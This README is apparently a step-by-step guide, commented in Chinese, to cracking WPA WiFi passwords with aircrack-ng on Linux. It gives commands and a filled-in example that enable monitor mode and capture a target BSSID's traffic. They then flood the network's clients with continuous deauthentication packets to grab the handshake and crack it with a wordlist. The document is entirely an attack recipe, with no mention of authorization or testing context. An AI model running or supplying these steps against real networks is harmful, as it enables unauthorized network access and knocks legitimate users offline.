# Aircrack-ng-Guide
A sample use guide for aircrack-ng in linux

### Step
- iwconfig	--查看网卡列表
- airmon-ng start <网卡名>	--打开用来破解的网卡
- iwconfig	--重新查看网卡列表，start后网卡名会变
- airodump-ng <网卡名>	--查看wifi列表
- airodump-ng -c <channel> --bssid <wifi破解目标的bssid> -w <文件名> <网卡名>	--抓取目wifi的网络包并存储
- aireplay-ng -0 0 -a <bssid> <网卡名>	--获取握手包，直到出现WPA handshake
- aircrack-ng -w <字典名> -b <bssid> 文件名*.cap	--利用字典破解.cap数据包

### Example
<pre><code>iwconfig
airmon-ng start wlp0s20u1
iwconfig
airodump-ng wlp0s20u1mon
airodump-ng -c 6 --bssid C0:61:18:29:9D:28 -w wifiname wlp0s20u1mon
aireplay-ng -0 0 -a C0:61:18:29:9D:28 wlp0s20u1mon
aircrack-ng -w wordlist.txt -b C0:61:18:29:9D:28 wifiname*.cap
</code></pre>
